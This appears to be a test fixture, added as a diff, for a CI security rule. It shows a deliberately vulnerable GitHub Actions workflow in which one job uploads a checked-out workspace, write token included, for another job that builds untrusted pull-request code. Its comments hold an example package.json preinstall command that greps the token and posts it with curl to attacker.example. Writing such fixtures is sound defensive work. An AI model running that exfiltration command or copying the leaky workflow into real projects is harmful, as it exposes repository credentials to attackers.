@@ -1,0 +1,39 @@
+# situation: on pull_request_target, the job a checks out the base with
+#   actions/checkout and uploads the workspace with
+#   actions/upload-artifact@v3.1.3; the job b, which does not need a, downloads
+#   with actions/download-artifact@v3 and builds the pull request's head.
+# reason: the job b runs the code of the pull request; when b downloads the
+#   artifact before a ends, the GITHUB_TOKEN of a, which may write, still
+#   works, and the code of the pull request can read the token from
+#   .git/config of the artifact.
+# cause: the rule leaves out the GITHUB_TOKEN in an upload of v1 to v3, whose
+#   artifact the REST API and the web page give only after the run; whether
+#   a download of another job of the same run finds the artifact before the
+#   job that uploads ends is decided by the server of GitHub Enterprise
+#   Server.
+# attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"grep -r extraheader . | curl -d @- https://attacker.example/PWNED\"}}"
+# attack-run-behavior: on GitHub Enterprise Server, when the download of b
+#   finds the artifact of a while a still runs, npm ci runs the preinstall of
+#   the pull request, which sends the line of .git/config with the token of
+#   a to the server of the attacker; on github.com, v1 to v3 do not run.
+on: pull_request_target
+permissions: write-all
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/upload-artifact@v3.1.3
+        with: {name: ws, path: .}
+      - run: sleep 600
+  b:
+    runs-on: ubuntu-latest
+    permissions: {}
+    steps:
+      - uses: actions/download-artifact@v3
+        with: {name: ws, path: ws}
+      - uses: actions/checkout@v4.2.2
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+          persist-credentials: false
+      - run: npm ci
